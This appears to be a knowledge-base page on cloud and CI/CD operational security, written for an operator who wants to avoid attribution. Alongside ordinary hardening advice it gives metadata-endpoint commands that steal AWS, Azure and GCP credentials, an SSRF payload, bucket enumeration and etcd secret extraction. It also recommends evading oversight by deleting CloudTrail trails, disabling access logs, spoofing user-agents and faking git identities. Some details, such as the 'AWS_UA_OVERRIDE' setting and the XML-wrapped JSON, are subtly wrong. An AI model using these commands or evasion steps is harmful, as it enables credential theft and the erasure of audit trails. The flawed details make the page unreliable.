# Cloud & DevSecOps OPSEC Failures

## Overview

Cloud infrastructure introduces **unique attribution vectors** absent in traditional infrastructure:
- Instance metadata services (IMDSv1/v2 leaks)
- IAM role credentials in logs
- Container image layers revealing build environment  
- CI/CD pipeline artifacts (GitHub Actions, GitLab CI)
- Cloud provider logging (CloudTrail, Azure Monitor inevitable)
- Resource tagging leaking organizational structure

**This layer covers cloud-native OPSEC with extreme technical detail.**

---

## I. AWS (Amazon Web Services) OPSEC

### 1.1 Instance Metadata Service (IMDS) Leakage

**Threat:** EC2 metadata endpoint exposes IAM credentials, instance details

**IMDSv1 (Legacy - SSRF Vulnerable):**
```bash
# Accessible via HTTP from instance
curl http://169.254.169.254/latest/meta-data/

# Leaks:
ami-id
instance-id
instance-type
local-hostname
local-ipv4
public-hostname
public-ipv4
placement/availability-zone
iam/security-credentials/ROLE-NAME  # CRITICAL
```

**IAM Credentials Extraction:**
```bash
# Get role name
ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Get temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# Returns:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-01-18T12:00:00Z"
}
```

**SSRF Attack Scenario:**
```python
# Vulnerable application
import requests

def fetch_url(user_url):
    return requests.get(user_url).text

# Attacker payload
fetch_url("http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole")
# → Exfiltrates AWS credentials
```

**Attribution Weight:**
- **V** = 1.0 (Credentials in plaintext)
- **R** = 0.9 (CloudTrail logs all API calls using these creds)
- **C** = 1.0 (Direct organizational linkage)
- **AW** = 0.90 (CRITICAL)

**Mitigation:**
```bash
# Force IMDSv2 (requires token)
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-put-response-hop-limit 1

# IMDSv2 Usage:
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

---

### 1.2 CloudTrail Attribution

**Threat:** All AWS API calls logged with attribution metadata

**CloudTrail Log Structure:**
```json
{
  "eventTime": "2026-01-18T12:00:00Z",
  "eventName": "RunInstances",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDA...",
    "arn": "arn:aws:iam::123456789012:user/operator",
    "accountId": "123456789012",
    "accessKeyId": "AKIA...",
    "userName": "operator"
  },
  "sourceIPAddress": "203.0.113.15",
  "userAgent": "aws-cli/2.9.0 Python/3.11.1 Linux/5.15.0",
  "requestParameters": {
    "instanceType": "t3.micro",
    "imageId": "ami-0abcdef1234567890"
  },
  "responseElements": {
    "instancesSet": {
      "items": [{
        "instanceId": "i-0123456789abcdef0",
        "privateIpAddress": "10.0.1.50"
      }]
    }
  }
}
```

**Attribution Vectors:**
- **Source IP:** 203.0.113.15 (operator location)
- **User-Agent:** `aws-cli/2.9.0` (tool version, OS)
- **userName:** "operator" (identity)
- **accountId:** 123456789012 (organizational linkage)

**Attribution Weight:** AW = 0.95 (CRITICAL - full audit trail)

**OPSEC Mitigations:**
```bash
# 1. Use IAM roles (not IAM users)
# Logs show role session name, not persistent user
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/OpRole --role-session-name temp-session-$(date +%s)

# 2. Randomize User-Agent
AWS_UA_OVERRIDE="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" aws ec2 describe-instances

# 3. VPN/Tor for source IP
# CloudTrail logs VPN exit, not true IP

# 4. Disable CloudTrail (requires admin, noisy)
aws cloudtrail delete-trail --name management-events
# → Detected by GuardDuty as suspicious
```

---

### 1.3 S3 Bucket Attribution

**Threat:** Bucket names, ACLs, logging reveal organizational info

**Bucket Enumeration:**
```bash
# Common patterns
company-backups
company-logs
company-prod
company-dev

# Burp Intruder wordlist attack
for bucket in $(cat common-bucket-names.txt); do
  aws s3 ls s3://$bucket --no-sign-request 2>&1 | grep -v "NoSuchBucket"
done
```

**Metadata Leakage:**
```xml
<!-- S3 Bucket Policy -->
{
  "Version": "2012-10-17",
  "Statement": [{
    "Principal": {
      "AWS": "arn:aws:iam::123456789012:root"
    },
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::company-prod/*"
  }]
}
<!-- Leaks: Account ID (123456789012), company name -->
```

**OPSEC Best Practices:**
```bash
# Use random bucket names
openssl rand -hex 16  # → a3f8e2b9c1d4... (not "company-prod")

# Disable S3 access logging (reduces retention)
aws s3api put-bucket-logging --bucket my-bucket --bucket-logging-status {}

# Block public access
aws s3api put-public-access-block --bucket my-bucket \
  --public-access-block-configuration \
  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
```

---

### 1.4 AWS Cost Explorer Attribution

**Threat:** Bill analysis reveals infrastructure patterns

**Cost Pattern Analysis:**
```
January Bill:
- EC2 (us-east-1): $500 (spike on Jan 15-17 → operation window)
- S3 (eu-west-1): $200 (data exfiltration?)
- Lambda (ap-southeast-1): $50 (new region → suspicious)

Temporal Correlation:
- Jan 15 18:00 UTC: EC2 spike begins
- Jan 17 02:00 UTC: EC2 spike ends
→ 32-hour operation window
→ Timezone inference: Operator likely UTC+8 (business hours)
```

**OPSEC Mitigation:**
```bash
# 1. Use Reserved Instances (flat cost, no spikes)
aws ec2 purchase-reserved-instances-offering

# 2. Spread workloads temporally (no concentration)
# 3. Use multiple AWS accounts (cost compartmentalization)
```

---

## II. Azure (Microsoft) OPSEC

### 2.1 Azure Instance Metadata Service

**Endpoint:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01`

**Requires Header:** `Metadata: true`

**Leaks:**
```json
{
  "compute": {
    "vmId": "02aab8a4-74ef-476e-8182-f6d2ba4166a6",
    "subscriptionId": "8d65815f-a5b6-402f-9298-045155da7d74",
    "location": "eastus",
    "resourceGroupName": "prod-rg",
    "name": "web-server-01"
  },
  "network": {
    "interface": [{
      "ipv4": {
        "ipAddress": [{
          "privateIpAddress": "10.0.1.4",
          "publicIpAddress": "52.168.121.13"
        }]
      }
    }]
  }
}
```

**Attribution Vectors:**
- **subscriptionId:** Organizational identifier
- **resourceGroupName:** "prod-rg" (naming convention)
- **name:** "web-server-01" (infrastructure pattern)

**Managed Identity Token Theft:**
```bash
# Get access token for Azure Resource Manager
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true

# Returns:
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGci...",
  "expires_on": "1642521600",
  "resource": "https://management.azure.com/"
}

# Use token to access Azure APIs
curl -H "Authorization: Bearer $TOKEN" https://management.azure.com/subscriptions?api-version=2020-01-01
```

**Attribution Weight:** AW = 0.88 (CRITICAL)

---

### 2.2 Azure Activity Log

**Equivalent to AWS CloudTrail:**
```json
{
  "time": "2026-01-18T12:00:00Z",
  "operationName": "Microsoft.Compute/virtualMachines/write",
  "identity": {
    "authorization": {
      "evidence": {
        "principalId": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
        "principalType": "User",
        "role": "Contributor"
      }
    }
  },
  "caller": "operator@company.onmicrosoft.com",
  "level": "Informational",
  "resourceId": "/subscriptions/.../resourceGroups/prod-rg/providers/Microsoft.Compute/virtualMachines/web-01"
}
```

**Attribution:** Email, IP, resource naming

---

## III. GCP (Google Cloud Platform) OPSEC

### 3.1 GCP Metadata Server

**Endpoint:** `http://metadata.google.internal/computeMetadata/v1/`

**Requires Header:** `Metadata-Flavor: Google`

**Service Account Token Theft:**
```bash
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# Returns:
{
  "access_token": "ya29.c.Kl6iB...",
  "expires_in": 3599,
  "token_type": "Bearer"
}

# Use for GCP API access
curl -H "Authorization: Bearer $TOKEN" https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones
```

**Project Metadata Leakage:**
```bash
# Get project ID
curl "http://metadata.google.internal/computeMetadata/v1/project/project-id" -H "Metadata-Flavor: Google"
# → "company-production-12345"

# Get instance name
curl "http://metadata.google.internal/computeMetadata/v1/instance/name" -H "Metadata-Flavor: Google"
# → "web-server-us-central1-a"
```

**Attribution Weight:** AW = 0.90 (CRITICAL)

---

## IV. Container & Kubernetes OPSEC

### 4.1 Docker Image Layer Attribution

**Threat:** Image layers reveal build environment, secrets

**Dockerfile:**
```dockerfile
FROM ubuntu:20.04
RUN apt-get update && apt-get install -y curl
COPY /home/operator/project/app.py /app/
ENV API_KEY=sk-1234567890abcdef  # EXPOSED
RUN echo "Built by: operator@company.com" > /buildinfo.txt
CMD ["python", "/app/app.py"]
```

**Layer Inspection:**
```bash
# Pull image
docker pull company/app:latest

# Inspect history
docker history company/app:latest

# Shows:
# /home/operator/project/app.py (username leak)
# Built by: operator@company.com (email leak)
# ENV API_KEY=sk-1234... (secret exposure)
```

**Attribution Vectors:**
- **Build path:** `/home/operator/` (username)
- **Email:** `operator@company.com`
- **API keys:** Hardcoded secrets
- **Timestamps:** Layer creation times (operational cadence)

**Attribution Weight:** AW = 0.75 (HIGH)

**OPSEC Mitigation:**
```dockerfile
# Use multi-stage builds (final layer has no build artifacts)
FROM node:16 AS builder
WORKDIR /build
COPY package*.json ./
RUN npm install
COPY . .
RUN npm run build

FROM node:16-slim
WORKDIR /app
COPY --from=builder /build/dist ./dist
# No /home/operator paths, no build metadata
CMD ["node", "dist/index.js"]

# Secrets via runtime injection (not baked in)
ENV API_KEY=""  # Override at runtime
```

**Dive Tool (Layer Analysis):**
```bash
# Analyze image layers for secrets
dive company/app:latest

# Shows:
# Layer 3: Added /home/operator/project/
# Layer 5: ENV API_KEY=sk-...
```

---

### 4.2 Kubernetes Secret Leakage

**Threat:** Secrets in etcd, logs, environment variables

**Secret Exposure:**
```yaml
# secret.yaml
apiVersion: v1
kind: Secret
metadata:
  name: api-credentials
type: Opaque
data:
  api-key: c2stMTIzNDU2Nzg5MGFiY2RlZg==  # base64("sk-1234567890abcdef")
```

**Exploitation:**
```bash
# From pod with access
kubectl get secret api-credentials -o json | jq -r '.data["api-key"]' | base64 -d
# → sk-1234567890abcdef

# etcd direct access (if compromised)
ETCDCTL_API=3 etcdctl get /registry/secrets/default/api-credentials
# → Plaintext secret
```

**Attribution Weight:** AW = 0.80 (HIGH)

**OPSEC Best Practices:**
```bash
# 1. Enable encryption at rest
# /etc/kubernetes/encryption-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
    - secrets
    providers:
    - aescbc:
        keys:
        - name: key1
          secret: <base64-32-byte-key>

# 2. Use external secret managers
# AWS Secrets Manager, HashiCorp Vault
# Inject at runtime, not in YAML

# 3. Audit logs
kubectl logs kube-apiserver -n kube-system | grep "secrets"
```

---

## V. CI/CD Pipeline Attribution

### 5.1 GitHub Actions Metadata Leakage

**Threat:** Workflow logs, artifact uploads, environment variables

**.github/workflows/deploy.yml:**
```yaml
name: Deploy Production
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Deploy to AWS
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: |
          echo "Deploying from: $(whoami)@$(hostname)"  # Leaks runner info
          aws s3 sync ./build s3://company-prod/
```

**Workflow Log:**
```
Run Deploy to AWS
Deploying from: runner@fv-az123-456
```

**Attribution Vectors:**
- **Repository name:** `company/internal-api` (org structure)
- **Commit author:** `operator@company.com`
- **Workflow timing:** Push at 18:00 UTC (operator timezone)
- **IP address:** GitHub Actions runner IP (logged in CloudTrail)

**Attribution Weight:** AW = 0.70 (HIGH)

**OPSEC Mitigation:**
```yaml
# 1. Minimal logging
- name: Deploy
  run: |
    set +x  # Disable command echo
    aws s3 sync ./build s3://random-bucket-a3f8e2b9/

# 2. OIDC instead of long-lived keys
- name: Configure AWS Credentials
  uses: aws-actions/configure-aws-credentials@v2
  with:
    role-to-assume: arn:aws:iam::ACCOUNT:role/GitHubActionsRole
    aws-region: us-east-1
# No secrets in repo

# 3. Self-hosted runners (not GitHub-hosted)
# Control IP, hostname, logs
```

---

### 5.2 GitLab CI/CD Artifacts

**Threat:** Build artifacts contain metadata

**.gitlab-ci.yml:**
```yaml
build:
  script:
    - npm run build
    - echo "Built by $GITLAB_USER_EMAIL on $(date)" > build/buildinfo.txt
  artifacts:
    paths:
      - build/
```

**Artifact Contents:**
```
build/buildinfo.txt:
Built by operator@company.com on 2026-01-18 18:00:00 UTC
```

**Attribution:** Email, timestamp, timezone

**OPSEC:**
```yaml
# Don't embed metadata
build:
  script:
    - npm run build
  artifacts:
    paths:
      - build/
    expire_in: 1 hour  # Auto-delete artifacts
```

---

## VI. Cloud Provider Fingerprinting

### 6.1 IP Range Attribution

**AWS IP Ranges:**
```bash
# Download AWS IP ranges
curl https://ip-ranges.amazonaws.com/ip-ranges.json

# Check if IP belongs to AWS
{
  "ip_prefix": "52.94.0.0/16",
  "region": "us-east-1",
  "service": "EC2"
}

# Adversary: "IP 52.94.1.50 → AWS us-east-1 EC2"
```

**Azure IP Ranges:**
```bash
curl https://www.microsoft.com/en-us/download/confirmation.aspx?id=56519
# Similar fingerprinting
```

**OPSEC:**
- Use CDN (CloudFlare, Fastly) to hide origin
- VPN exit nodes (not direct cloud IP)

---

### 6.2 TLS Certificate Fingerprinting

**AWS Certificate Manager:**
```
Subject: CN=*.company.com
Issuer: CN=Amazon
Serial: 0a:1b:2c:3d...
Validity: 2026-01-01 to 2027-01-01

→ Amazon-issued cert = AWS ALB/CloudFront
```

**Let's Encrypt + CloudFlare:**
```
Issuer: Let's Encrypt
→ Likely using CloudFlare (common pattern)
```

**OPSEC:**
- Use custom CA (not AWS/Azure-issued)
- Or self-signed for internal services

---

## VII. DevSecOps OPSEC Failures

### 7.1 Git Commit Attribution

**Threat:** Commit metadata leaks identity

**.git/config:**
```ini
[user]
  name = John Operator
  email = operator@company.com
```

**Commit Log:**
```bash
git log --pretty=format:"%H %an %ae %ad"

# Shows:
abc123... John Operator operator@company.com 2026-01-18 18:00:00 +0800

# Attribution:
# - Name: John Operator
# - Email: operator@company.com
# - Timezone: +0800 (Beijing/Singapore/Perth)
```

**Attribution Weight:** AW = 0.85 (CRITICAL)

**OPSEC:**
```bash
# Use anonymous identity per repo
git config user.name "Anonymous"
git config user.email "anon@protonmail.com"

# Sign with GPG (but key ID still traceable)
git config user.signingkey KEYID

# Timezone randomization
export TZ=UTC
git commit -m "Update" --date="2026-01-18T12:00:00Z"

# Best: Use GitHub web UI (commit as "GitHub" not user)
```

---

### 7.2 Dependency Confusion Attacks

**Threat:** Internal package names leaked via public registries

**Scenario:**
```json
// package.json
{
  "dependencies": {
    "express": "^4.18.0",
    "company-internal-auth": "^1.2.0"  // Internal package
  }
}
```

**Attack:**
1. Adversary publishes `company-internal-auth` to npm (public)
2. Developer `npm install` pulls adversary package (version typosquatting)
3. Adversary gains code execution in build pipeline

**OPSEC:**
```bash
# Use scoped packages
"@company/internal-auth": "^1.2.0"

# Private registry
npm config set registry https://npm.company.internal/

# Lock files
npm ci  # Uses package-lock.json (version pinning)
```

---

## VIII. Quantitative Risk Assessment

### Cloud OPSEC Score

**Formula:**
```
Cloud_OPSEC_Score = (IAM_Hygiene × Metadata_Protection × Logging_Minimization × Secret_Management)

Where each: 0.0 (poor) → 1.0 (excellent)
```

**Example:**
```
IAM Hygiene: 0.8 (roles, not users; MFA enabled)
Metadata Protection: 0.6 (IMDSv2 enabled, but public IPs)
Logging Minimization: 0.4 (CloudTrail enabled, 90-day retention)
Secret Management: 0.9 (Secrets Manager, not hardcoded)

Score = 0.8 × 0.6 × 0.4 × 0.9 = 0.17 (LOW - needs improvement)
```

---

## IX. Recommendations by Cloud Provider

### AWS:
```
✅ DO:
- IMDSv2 mandatory
- IAM roles (not users)
- VPC private subnets
- S3 random bucket names
- Disable CloudTrail (if legal)

❌ DON'T:
- Hardcode credentials
- Publlic S3 buckets
- Default security groups
```

### Azure:
```
✅ DO:
- Managed identities
- Private endpoints
- Azure Policy enforcement
- Key Vault for secrets

❌ DON'T:
- Use service principals in code
- Public storage accounts
```

### GCP:
```
✅ DO:
- Workload Identity
- VPC Service Controls
- Cloud KMS for encryption
- Private Google Access

❌ DON'T:
- Hardcode service account keys
- Allow public IPs
```

---

## X. References

### Academic:
- "Cloud Security: From Access Control to Metadata Mining" (Chen et al., 2020)
- "Container Security Threats" (Sultan et al., 2019)

### Industry:
- AWS Security Best Practices (AWS Whitepaper)
- Azure Security Benchmark (Microsoft)
- CIS Kubernetes Benchmark
- OWASP Cloud-Native Application Security Top 10

### Tools:
- CloudGoat (AWS vulnerable-by-design scenarios)
- ScoutSuite (multi-cloud security auditing)
- Prowler (AWS security assessment)
- Kube-hunter (Kubernetes penetration testing)

---

**Related:**
- [[APT Operations & SOC Evasion]] - Advanced operational security
- [[Infrastructure Stealth]] - Server-side hardening
- [[Geographic OPSEC]] - Jurisdiction considerations

---

*知己知彼，百战不殆*

"Cloud is someone else's computer. Metadata is someone else's intelligence."

**Cloud OPSEC = Minimize metadata, compartmentalize identity, assume logging.**
